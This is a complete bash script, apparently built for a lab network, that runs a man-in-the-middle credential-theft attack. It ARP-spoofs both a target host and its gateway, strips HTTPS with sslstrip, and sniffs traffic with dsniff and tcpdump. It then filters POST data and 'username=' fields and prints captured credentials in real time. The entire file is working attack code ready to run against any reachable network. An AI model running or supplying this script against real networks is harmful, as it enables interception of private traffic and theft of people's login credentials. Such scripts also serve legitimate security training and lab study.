#!/bin/bash

# Default targets (will be overwritten by arguments if provided)
TARGET_IP="$1"
GATEWAY_IP="$2"

if [ -z "$TARGET_IP" ] || [ -z "$GATEWAY_IP" ]; then
    echo "Usage: ./attack.sh <TARGET_IP> <GATEWAY_IP>"
    echo "Example: ./attack.sh 172.20.0.20 172.20.0.1"
    exit 1
fi

echo "[*] Starting attack on Target: $TARGET_IP with Gateway: $GATEWAY_IP"

# Cleanup previous runs (fixes "Address already in use" error)
echo "[*] Cleaning up old processes..."
pkill -f sslstrip
pkill -f arpspoof
pkill -f dsniff
pkill -f tcpdump
pkill -f tail
sleep 1

# Ensure setup is run
./setup.sh

# Start sslstrip
echo "[*] Starting sslstrip on port 8080..."
sslstrip -l 8080 -f -w sslstrip.log &
SSLSTRIP_PID=$!
echo "[+] sslstrip running (PID: $SSLSTRIP_PID)"

# Create log files
# Clear log files (Fix for ghost credentials)
> sslstrip.log
> dsniff.log

# Tail the log file in the background to show credentials in real-time
echo "[*] Waiting for credentials..."
# We rely on tcpdump for the pretty output now, so we don't need to clutter screen with logs
# tail -f sslstrip.log &
# TAIL_PID1=$!
# tail -f dsniff.log &
# TAIL_PID2=$!

# Start dsniff (redirect output to log file since -w is not supported in this version)
echo "[*] Starting dsniff..."
dsniff -i eth0 -m -d > dsniff.log 2>&1 &
DSNIFF_PID=$!

# Monitor sslstrip.log for credentials (more reliable than tcpdump parsing)
echo "[*] Monitoring sslstrip.log for credentials..."
tail -f sslstrip.log | grep --line-buffered -a -E "POST Data|username=" | while read line; do
    echo -e "\n\033[1;31m[!] CAPTURED DATA EVENT:\033[0m\033[1;32m$line\033[0m\n"
done &
LOG_PID=$!

# Also keep a raw tcpdump running just in case, but silent mostly
# looking for `username` in plain text on eth0
tcpdump -i eth0 -A -l 2>/dev/null | grep --line-buffered -a "username=" | while read line; do
     echo -e "\n\033[1;31m[!] SAW PLAINTEXT CREDENTIALS ON WIRE:\033[0m\033[1;32m$line\033[0m\n"
done &
TCPDUMP_PID=$!

# Start arpspoof
echo "[*] Starting arpspoof..."
echo "    Spoofing $TARGET_IP that I am $GATEWAY_IP"
arpspoof -i eth0 -t $TARGET_IP $GATEWAY_IP > /dev/null 2>&1 &
ARPSPOOF_PID1=$!

echo "    Spoofing $GATEWAY_IP that I am $TARGET_IP"
arpspoof -i eth0 -t $GATEWAY_IP $TARGET_IP > /dev/null 2>&1 &
ARPSPOOF_PID2=$!

echo "[+] Attack running. Check sslstrip.log for credentials."
echo "Press ENTER to stop the attack."
read

kill $LOG_PID
kill $SSLSTRIP_PID
kill $DSNIFF_PID
kill $TCPDUMP_PID
kill $ARPSPOOF_PID1
kill $ARPSPOOF_PID2
echo "[*] Attack stopped."
